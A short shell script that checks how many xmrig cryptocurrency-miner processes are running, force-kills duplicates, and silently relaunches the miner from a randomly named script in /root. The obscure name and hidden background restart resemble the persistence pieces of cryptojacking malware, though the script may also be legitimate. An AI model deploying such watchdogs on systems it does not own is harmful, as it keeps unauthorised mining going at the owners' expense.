#!/bin/sh

xrig=$(pgrep -cx xmrig)

if [ "$xrig" -eq 1 ]; then
    echo "Miner is running..."
elif [ "$xrig" -gt 1 ]; then
    echo "Miner is running more than usual, killing all instances."
    killall -9 xmrig
    bash /root/xinixzph.sh </dev/null &>/dev/null &
    echo "Miner is starting to run after killing services.."
else
    bash /root/xinixzph.sh </dev/null &>/dev/null &
    echo "Miner is starting to run"
fi
